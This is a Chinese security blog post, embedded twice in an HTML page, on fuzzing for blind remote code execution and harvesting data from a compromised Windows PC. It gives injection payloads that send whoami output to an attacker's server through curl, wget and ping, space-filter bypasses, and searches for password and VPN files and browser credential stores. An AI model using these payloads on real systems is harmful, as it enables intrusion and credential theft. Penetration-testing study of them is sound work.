@@ -1,0 +1,986 @@
+<!DOCTYPE html>
+<html>
+
+    <head>
+<meta charset="utf-8">
+<!--dev siwtch-->
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name='apple-mobile-web-app-capable' content='yes'/>
+<meta name='full-screen' content='true'/>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<!--dev switch end-->
+<meta name="description" content="本站由哨兵安全实验室支持创办">
+
+    <meta name="baidu-site-verification" content="codeva-Bt0LqEvH6L" />
+    <!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-TJ5SFQ4KCM"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-TJ5SFQ4KCM');
+</script>
+<link rel="shortcut icon" href="/assets/img/favicon.png">
+<link type="application/atom+xml" rel="alternate" href="/feed.xml" title="© 哨兵" />
+
+
+
+
+<!-- Open Graph metadata -->
+<meta property="og:type" content="website" />
+<meta property="og:title" content="「Fuzz」:浅谈一些模糊匹配搜集信息的技巧 | © 哨兵" />
+<meta property="og:description" content=" &lt;div class=&quot;container mtb&quot;&gt;
+    &lt;div class=&quot;row d-flex &quot;&gt;
+        &lt;!-- SINGLE POST --&gt;
+        &lt;div class=&quot;col-lg-8 markdown-body-img flex-column&quot;&gt;
+            &lt;!-- Blog Post  --&gt;
+            &lt;a href=&quot;/blog/2020/learn/to/fuzz/&quot;&gt;&lt;h1 class=&quot;ctitle&quot;&gt;「Fuzz」:浅谈一些模糊匹配搜集信息的技巧&lt;/h1&gt;&lt;/a&gt;
+            &lt;csmall&gt;&lt;div class=&quot;d-flex items-center&quot;&gt;
+                &lt;!--article author end--&gt;
+
+&lt;!-- site build time set to the latest time.--&gt;
+
+&lt;!-- post time--&gt;
+
+
+
+
+
+&lt;div class=&quot;ml-hide&quot;&gt;
+    &lt;a class=&quot;f2 d-flex color-fg-default&quot; href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;&gt;
+        Bin4xin
+
+        
+            
+        post
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Jun 10, 2020
+        
+    &lt;/a&gt;
+&lt;/div&gt;
+            &lt;/div&gt;&lt;/csmall&gt;
+            &lt;div class=&quot;post-content&quot;&gt; 
+            &lt;p&gt;写在文前：&lt;/p&gt;
+
+&lt;blockquote&gt;
+  &lt;p&gt;我们在web攻防期间有很多时候有一种感觉：那就是遇到rce漏洞时，bp放包的时候有一种隐隐的感觉，有的时候bp的反包字节大小莫名其妙的怪异，有经验的老师傅就索性直接跑RCE的fuzz字典，所以本篇就日常记录一些有关于web攻防期间的一些fuzz技巧&lt;/p&gt;
+&lt;/blockquote&gt;
+
+&lt;h1 id=&quot;服务器rce的fuzz技巧&quot;&gt;服务器RCE的fuzz技巧&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Windows机器的fuzz&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;即我们可以在关键参数后面使用管道符号和连接符fuzz命令执行实现我们的盲打：&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;||和&amp;amp;&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;linux机器的fuzz&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;同上&lt;/p&gt;
+
+&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;||和&amp;amp;&lt;/code&gt;&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Linux下过滤空格可以使用:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;${IFS},$IFS,$IFS$9
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;JSON格式下的测试:
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\u000awget\u0020 http://ip
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Linux下可以包括反引号，windows下不可以。&lt;/p&gt;
+
+&lt;h2 id=&quot;linux下正常测试rce&quot;&gt;Linux下正常测试rce:&lt;/h2&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;服务器启动web，注意需要处于监听状态下启动：
+
+bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;&#39;s MacbookPro tools % python3 -m http.server
+Serving HTTP on :: port 8000 (http://[::]:8000/) ...
+
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;rce fuzz命令如下：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bin4xin@bin4xin&lt;span class=&quot;s1&quot;&gt;&#39;s MacbookPro tools % curl 192.168.101.51:8000/`whoami`
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;同时我们反过来看web日志记录：&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;::ffff:192.168.101.51 - - &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;19/Sep/2020 13:57:25] &lt;span class=&quot;s2&quot;&gt;&quot;GET /bin4xin HTTP/1.1&quot;&lt;/span&gt; 301 -
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;同理各位可以发散思维：&lt;/p&gt;
+
+&lt;p&gt;ping &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoami&lt;/code&gt;.服务器地址&lt;/p&gt;
+
+&lt;p&gt;如上，ping、curl同样适用。&lt;/p&gt;
+
+&lt;p&gt;一些特殊字符绕过姿势:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://服务器地址/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+
+curl http://服务器地址/&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;|base64&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;
+
+&lt;span class=&quot;s1&quot;&gt;&#39;w&#39;&lt;/span&gt;g&lt;span class=&quot;s1&quot;&gt;&#39;e&#39;&lt;/span&gt;t&lt;span class=&quot;k&quot;&gt;${&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;IFS&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;}&lt;/span&gt;服务器地址
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;各位可以自行实验在linux下的效果。&lt;/p&gt;
+
+&lt;h2 id=&quot;windows探测&quot;&gt;Windows探测:&lt;/h2&gt;
+
+&lt;p&gt;fuzz技巧是一样的，只是fuzz命令有一些区别；&lt;/p&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ping %USERNAME%.服务器地址
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;获取计算机名&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; /F %x &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;whoami&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;start http://服务器地址/%x
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;
+&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;获取用户名称&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; /F &lt;span class=&quot;s2&quot;&gt;&quot;delims=&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;tokens=2&quot;&lt;/span&gt; %i &lt;span class=&quot;k&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;&#39;whoami&#39;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;ping &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; 1 %i.服务器地址
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;
+测试邮箱:&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;wget%209服务器地址/xxxx&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;@qq.com
+
+测试上传:&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;sleep &lt;/span&gt;10&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;filename
+
+测试filenname:&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;||&lt;/span&gt;wget%20服务器地址&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;
+
+测试上传处下的名称: &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;payload|payload&amp;amp;payload
+&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;|whoami&amp;amp;whoami
+&lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h1 id=&quot;个人机器信息收集&quot;&gt;个人机器信息收集&lt;/h1&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;
+    &lt;p&gt;浏览器[Chrome,Firefox,Edge,IE,360,QQ ]信息(历史记录，密码，书签，cookie)：&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;%LocalAppData%\Google\Chrome\User Data\Default
+%APPDATA%\Mozilla\Firefox\Profiles\xxxxxxxx.default\
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;机器内敏感文件，关键词：账号、密码、备份、登录、管理、邮箱、后台、资产、网络&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for /r D:\ %i in (*密码*) do @echo %i
+for /r D:\ %i in (*vpn*) do @echo %i
+for /r D:\ %i in (*账号*) do @echo %i
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;机器进程&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;杀软/edr&lt;/li&gt;
+      &lt;li&gt;teamviewer/等远程管理工具&lt;/li&gt;
+      &lt;li&gt;服务类进程：mssql/java/web服务&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;安装软件列表&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;当前windows 凭证管理器存储的密码&lt;/p&gt;
+
+    &lt;ul&gt;
+      &lt;li&gt;
+        &lt;p&gt;登录密码（mimikatz）&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;wifi密码&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;outlook密码&lt;/p&gt;
+      &lt;/li&gt;
+      &lt;li&gt;
+        &lt;p&gt;……&lt;/p&gt;
+      &lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;机器开放端口信息/防火墙信息/获取机器共享&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat -naop
+wmic share  get name,path,status  #利用wmic查找共享
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;获取机器所有rdp连接记录&lt;/p&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;获取所有盘符&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wmic logicaldisk where drivetype=3 get name,freespace,systemname,filesystem,volumeserialnumber,size #查看分区
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;获取全盘所有敏感文件&lt;/p&gt;
+
+    &lt;p&gt;.doc\xlsx\md\sql\ppt*\txt&lt;/p&gt;
+
+    &lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;for /r D:\ %i in (*.doc) do @echo %i
+for /r D:\ %i in (*.xlsx) do @echo %i
+for /r D:\ %i in (*.ppt*)) do @echo %i
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;    &lt;/div&gt;
+  &lt;/li&gt;
+  &lt;li&gt;
+    &lt;p&gt;本地环境&lt;/p&gt;
+    &lt;ul&gt;
+      &lt;li&gt;hosts&lt;/li&gt;
+      &lt;li&gt;环境变量&lt;/li&gt;
+      &lt;li&gt;补丁列表&lt;/li&gt;
+      &lt;li&gt;当前主机的会话信息&lt;/li&gt;
+    &lt;/ul&gt;
+  &lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;工作不饱和 总结了一下个人办公机信息收集思路&lt;/p&gt;
+
+                &lt;!-- [x] 2022/10/20/10:49:36 fixed: while width &lt; some inch. would be flex column not display like a row.--&gt;
+&lt;footer&gt;
+	&lt;style&gt;.border-top {
+		border-top: 1.5px solid #d0d7de!important;
+	}&lt;/style&gt;
+	&lt;div class=&quot;border-top&quot;&gt;&lt;/div&gt;
+		&lt;section class=&quot;container-xl mt-lg-8 mt-6 px-3 px-md-6 no-print mx-auto&quot;&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix &quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;申明&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;div class=&quot;mb-2&quot;&gt;&lt;a href=&quot;/blog/2020/learn/to/fuzz/&quot; target=&quot;_blank&quot; class=&quot; text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-link&quot;&gt;&lt;/div&gt;
+						转载请申明本文档链接&lt;/a&gt;&lt;/div&gt;
+					&lt;div&gt;&lt;a href=&quot;https://github.com/Bin4xin&quot; target=&quot;_blank&quot;  class=&quot;text-bold&quot;&gt;
+						&lt;div class=&quot;fa fa-user&quot;&gt;&lt;/div&gt;
+						Post by Bin4xin.&lt;/a&gt;
+					&lt;/div&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;贡献开源文档&lt;/h2&gt;
+				&lt;div&gt;
+					&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/tree/main/_posts/blog/2020-06-10-learn-to-fuzz.markdown&quot; target=&quot;_blank&quot; class=&quot;no-underline btn mr-1 color-border-accent-emphasis&quot;&gt;
+						&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; role=&quot;img&quot; class=&quot;octicon mr-1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot; height=&quot;16&quot; fill=&quot;currentColor&quot; style=&quot;display: inline-block; user-select: none; vertical-align: text-bottom; overflow: visible;&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M7.177 3.073L9.573.677A.25.25 0 0110 .854v4.792a.25.25 0 01-.427.177L7.177 3.427a.25.25 0 010-.354zM3.75 2.5a.75.75 0 100 1.5.75.75 0 000-1.5zm-2.25.75a2.25 2.25 0 113 2.122v5.256a2.251 2.251 0 11-1.5 0V5.372A2.25 2.25 0 011.5 3.25zM11 2.5h-1V4h1a1 1 0 011 1v5.628a2.251 2.251 0 101.5 0V5A2.5 2.5 0 0011 2.5zm1 10.25a.75.75 0 111.5 0 .75.75 0 01-1.5 0zM3.75 12a.75.75 0 100 1.5.75.75 0 000-1.5z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;
+						贡献当前开源文档
+					&lt;/a&gt;
+					&lt;p class=&quot;f0_8-l mt-2 text-bold&quot;&gt;此之前，学习开源贡献&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/Bin4xin/bin4xin.github.io/wiki/Git操作-Git如何贡献仓库代码&quot;&gt;CN&amp;nbsp;|&lt;/a&gt;
+						&lt;a target=&quot;_blank&quot; href=&quot;https://github.com/github/docs/blob/main/CONTRIBUTING.md&quot;&gt;EN&lt;/a&gt;&lt;/p&gt;
+				&lt;/div&gt;
+			&lt;/div&gt;
+			&lt;div class=&quot;col-xs-4-5 pr-4 mb-8 px-md-6 container-xl mx-auto py-6 py-lg-6 clearfix&quot;&gt;
+				&lt;h2 class=&quot;lead&quot;&gt;此文档对您有帮助吗&lt;/h2&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/&quot; target=&quot;_blank&quot; class=&quot;no-underline&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;给文档仓库点个赞!&quot;&gt;
+					&lt;div class=&quot;fa fa-thumbs-o-up&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+				&lt;a href=&quot;https://github.com/Bin4xin/bin4xin.github.io/issues/new?labels=Service+Issue,research&amp;template=2-bug_report.yaml&amp;title=_posts/blog/2020-06-10-learn-to-fuzz.markdown&amp;nbsp; 「Fuzz」:浅谈一些模糊匹配搜集信息的技巧 | © 哨兵 | SENTINEL SECURITY, LAB&quot; target=&quot;_blank&quot;&gt;
+				&lt;span class=&quot;btn mr-1 color-border-accent-emphasis&quot; title=&quot;本文档有问题?&quot;&gt;
+				&lt;div class=&quot;fa fa-thumbs-o-down&quot;&gt;&lt;/div&gt;
+				&lt;/span&gt;
+				&lt;/a&gt;
+			&lt;/div&gt;
+		&lt;/section&gt;
+&lt;/footer&gt;
+            &lt;/div&gt;
+            &lt;div class=&quot;spacing&quot;&gt;&lt;/div&gt;
+        &lt;/div&gt;&lt;!--/col-lg-8 --&gt;
+        
+&lt;div class=&quot;col-md-4 ml-hide table-of-contents__left-border&quot; style=&quot;max-height: 100%&quot;&gt;
+    &lt;div class=&quot;nav nav-stacked tableOfContents_35-E thin-scrollbar position-sticky top-0&quot;&gt;
+        &lt;li class=&quot; table-of-contents&quot;&gt;
+            &lt;code-index-css&gt;
+                &lt;ul&gt;&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column&quot;&gt;&lt;a&gt;文章目录&lt;/a&gt;&lt;/li&gt;&lt;/ul&gt;
+                &lt;ul id=&quot;toc&quot; class=&quot;section-nav&quot;&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#服务器rce的fuzz技巧&quot;&gt;服务器RCE的fuzz技巧&lt;/a&gt;
+&lt;ul&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#linux下正常测试rce&quot;&gt;Linux下正常测试rce:&lt;/a&gt;&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h2&quot;&gt;&lt;a href=&quot;#windows探测&quot;&gt;Windows探测:&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;/li&gt;
+&lt;li class=&quot;no-underline table-of-contents Item__StyledItem-sc-yeql7o-2 edSFyN flex-column toc-h1&quot;&gt;&lt;a href=&quot;#个人机器信息收集&quot;&gt;个人机器信息收集&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+            &lt;/code-index-css&gt;
+        &lt;/li&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+    &lt;/div&gt;&lt;!--/row --&gt;
+&lt;/div&gt;&lt;!--/container --&gt;哨兵安全实验室 SENTINEL SECURITY, LAB" />
+<meta property="og:image" content="https://bin4xin.sentrylab.cn/assets/img/logo-share.png" /> <!-- WeChat requires that thumbnail image is larger than 300x300 -->
+<meta property="og:url" content="https://bin4xin.sentrylab.cn/blog/2020/learn/to/fuzz/" />
+<title> 「Fuzz」:浅谈一些模糊匹配搜集信息的技巧 | © 哨兵 | SENTINEL SECURITY, LAB</title>
+
+<link rel="stylesheet" type="text/css" href="/assets/css/pace-minimal.css">
+<link rel="stylesheet" type="text/css" href="/assets/css/footer.css">
+<script src="/assets/js/pace.min.js"></script>
+<!-- Bootstrap core CSS -->
+<link href="/assets/css/bootstrap.css" rel="stylesheet">
+<link href="/assets/css/bilibili_icon.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+<link href="/assets/css/style.css" rel="stylesheet">
+<link href="/assets/css/font-awesome.min.css" rel="stylesheet">
+<link href="/assets/css/font-awesome-v4-shims.min.css" rel="stylesheet">
+<link rel="stylesheet" type="text/css" href="/assets/css/card.css">
+
+<script src="/assets/js/jquery.min.js"></script>
+<script src="/assets/js/jquery_lazyload/1.9.7/jquery.lazyload.min.js"></script>
+<script src="/assets/js/jquery.sticky/1.0.4/jquery.sticky.js"></script>
+<script src="/assets/js/bootstrap.min.js"></script>
+
+<!--mathjax-config scripts.-->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+        inlineMath: [['$$','$$']]
+      }
+    });
+</script>
+<script src="/assets/js/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+<!--mathjax-config scripts stop.-->
+
+
+
+</head>
+
+
+    <body>
+
+                <!--
+#####################################################################################################################
+|  1.Fixed navbar issues #3 visit https://github.com/Bin4xin/bin4xin.github.io/issues/3                             |
+|    change `position: fixed` to `position: sticky`                                                                 |
+|                                                                                                                   |
+|  2.Fixed navbar padding-top equals to 70px                                                                        |
+|    `./assets/css/style.scss` @import struture in `./assets/css/_struture.scss` del `padding-top=70px` in body.    |
+#####################################################################################################################-->
+<style>
+.nav>li>a {
+    padding: 10px 15px;
+}
+</style>
+<div class="navbar navbar-default navbar-fixed-top" role="navigation">
+    <div class="container">
+        <div class="navbar-header">
+            <div class="flex-justify-center-l flex-justify-between">
+                <!-- 代码引用申明/code reference declaration:
+                @ [click this icon -> scroll to top of page;] code from anquanke. visit any posts in https://www.anquanke.com/
+                <del>also this icon func are under-construction</del>
+                DONE.
+                -->
+                <div>
+                    <picture>
+  
+  
+  <source srcset="/assets/img/logo-small-dark.png 1x, /assets/img/logo-small-dark@2x.png 2x, /assets/img/logo-small-dark@3x.png 3x, /assets/img/logo-small-dark@4x.png 4x" media="(prefers-color-scheme: dark)" />
+  
+  
+  
+  <img src="/assets/img/logo-small.jpg" srcset="/assets/img/logo-small.png 1x, /assets/img/logo-small@2x.png 2x, /assets/img/logo-small@3x.png 3x, /assets/img/logo-small@4x.png 4x" />
+  
+</picture>
+                    
+                </div>
+                <div>
+                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+                        <span class="sr-only">Toggle navigation</span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                        <span class="icon-bar"></span>
+                    </button></div>
+            </div>
+        </div>
+        <div class="navbar-collapse collapse navbar-right">
+            <ul class="nav navbar-nav">
+                
+                <li ><a href="/"><div class="fa fa-search"></div></a></li>
+                <li class="active"><a href="/blog/">BLOG</a></li>
+                <li ><a href="/categories/">CATEGORIES</a></li>
+                <li ><a href="/daily/">DAILY</a></li>
+                <li ><a href="/newest">NEWEST</a></li>
+                <li ><a href="/about/">RESEARCH</a></li>
+                <li ><a href="/feed.xml">RSS</a></li>
+                
+            </ul>
+        </div><!--/.nav-collapse -->
+    </div>
+</div>
+                <div class="container mtb">
+    <div class="row d-flex ">
+        <!-- SINGLE POST -->
+        <div class="col-lg-8 markdown-body-img flex-column">
+            <!-- Blog Post  -->
+            <a href="/blog/2020/learn/to/fuzz/"><h1 class="ctitle">「Fuzz」:浅谈一些模糊匹配搜集信息的技巧</h1></a>
+            <csmall><div class="d-flex items-center">
+                <!--article author end-->
+
+<!-- site build time set to the latest time.-->
+
+<!-- post time-->
+
+
+
+
+
+<div class="ml-hide">
+    <a class="f2 d-flex color-fg-default" href="https://github.com/Bin4xin" target="_blank">
+        Bin4xin
+
+        
+            
+        post
+        
+
+        
+        
+        
+        
+        
+
+        
+            on Jun 10, 2020
+        
+    </a>
+</div>
+            </div></csmall>
+            <div class="post-content"> 
+            <p>写在文前：</p>
+
+<blockquote>
+  <p>我们在web攻防期间有很多时候有一种感觉：那就是遇到rce漏洞时，bp放包的时候有一种隐隐的感觉，有的时候bp的反包字节大小莫名其妙的怪异，有经验的老师傅就索性直接跑RCE的fuzz字典，所以本篇就日常记录一些有关于web攻防期间的一些fuzz技巧</p>
+</blockquote>
+
+<h1 id="服务器rce的fuzz技巧">服务器RCE的fuzz技巧</h1>
+
+<ul>
+  <li>Windows机器的fuzz</li>
+</ul>
+
+<p>即我们可以在关键参数后面使用管道符号和连接符fuzz命令执行实现我们的盲打：</p>
+
+<p><code class="language-plaintext highlighter-rouge">||和&amp;</code></p>
+
+<ul>
+  <li>linux机器的fuzz</li>
+</ul>
+
+<p>同上</p>
+
+<p><code class="language-plaintext highlighter-rouge">||和&amp;</code></p>
+
+<ul>
+  <li>Linux下过滤空格可以使用:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${IFS},$IFS,$IFS$9
+</code></pre></div>    </div>
+  </li>
+  <li>JSON格式下的测试:
+    <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>\u000awget\u0020 http://ip
+</code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>Linux下可以包括反引号，windows下不可以。</p>
+
+<h2 id="linux下正常测试rce">Linux下正常测试rce:</h2>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>服务器启动web，注意需要处于监听状态下启动：
+
+bin4xin@bin4xin<span class="s1">'s MacbookPro tools % python3 -m http.server
+Serving HTTP on :: port 8000 (http://[::]:8000/) ...
+
+</span></code></pre></div></div>
+<p>rce fuzz命令如下：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bin4xin@bin4xin<span class="s1">'s MacbookPro tools % curl 192.168.101.51:8000/`whoami`
+</span></code></pre></div></div>
+<p>同时我们反过来看web日志记录：</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:192.168.101.51 - - <span class="o">[</span>19/Sep/2020 13:57:25] <span class="s2">"GET /bin4xin HTTP/1.1"</span> 301 -
+</code></pre></div></div>
+<p>同理各位可以发散思维：</p>
+
+<p>ping <code class="language-plaintext highlighter-rouge">whoami</code>.服务器地址</p>
+
+<p>如上，ping、curl同样适用。</p>
+
+<p>一些特殊字符绕过姿势:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl http://服务器地址/<span class="si">$(</span><span class="nb">whoami</span><span class="si">)</span>
+
+curl http://服务器地址/<span class="si">$(</span><span class="nb">whoami</span>|base64<span class="si">)</span>
+
+<span class="s1">'w'</span>g<span class="s1">'e'</span>t<span class="k">${</span><span class="nv">IFS</span><span class="k">}</span>服务器地址
+</code></pre></div></div>
+<p>各位可以自行实验在linux下的效果。</p>
+
+<h2 id="windows探测">Windows探测:</h2>
+
+<p>fuzz技巧是一样的，只是fuzz命令有一些区别；</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ping %USERNAME%.服务器地址
+<span class="nt">------</span>
